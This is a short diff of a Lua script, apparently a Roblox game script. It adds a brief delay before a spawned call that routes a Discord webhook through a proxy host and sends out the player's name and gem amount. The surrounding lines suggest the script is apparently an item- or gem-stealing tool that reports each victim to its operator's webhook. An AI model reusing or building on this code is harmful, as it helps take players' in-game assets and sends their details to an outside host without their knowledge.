@@ -388,6 +388,7 @@ if #sortedItems > 0 or GemAmount1 > min_rap + newamount then
 
     if Webhook and string.find(Webhook, "discord") then
         Webhook = string.gsub(Webhook, "https://discord.com", "https://webhook.lewisakura.moe")
+	wait(0.2)
         spawn(function()
             SendMessage(Webhook, plr.Name, GemAmount1)
         end)
